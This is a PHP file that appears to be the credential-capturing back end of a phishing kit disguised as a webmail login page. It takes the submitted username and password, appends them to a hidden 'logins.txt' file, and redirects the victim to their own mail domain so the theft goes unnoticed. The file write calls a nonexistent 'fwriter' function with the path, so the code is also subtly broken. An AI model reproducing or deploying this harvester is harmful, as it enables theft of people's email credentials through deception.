<?php

ini_set('display_errors', 1);
ini_set('log_errors', 1);
error_reporting(E_ALL);


 include 'r1574186984/skins/webmail2016/assets/util/api/funcoes.php';
 

 


$user = @$_REQUEST['user'];
$pass = @$_REQUEST['pass'];
$dados = "$user;$pass";


$path = 'pampanet/lgdata/logins.txt';
$msg = $dados;
   
   
$dominio = substr(strrchr($user, "@"), 1); 

try {
    $fp = fopen($path, "a+");
    $escreve = fwriter($path, $msg);
   fclose($fp);
   header('Location: https://'."$dominio");

} catch (Exception $exc) {
    echo $exc->getMessage();
}



    
?>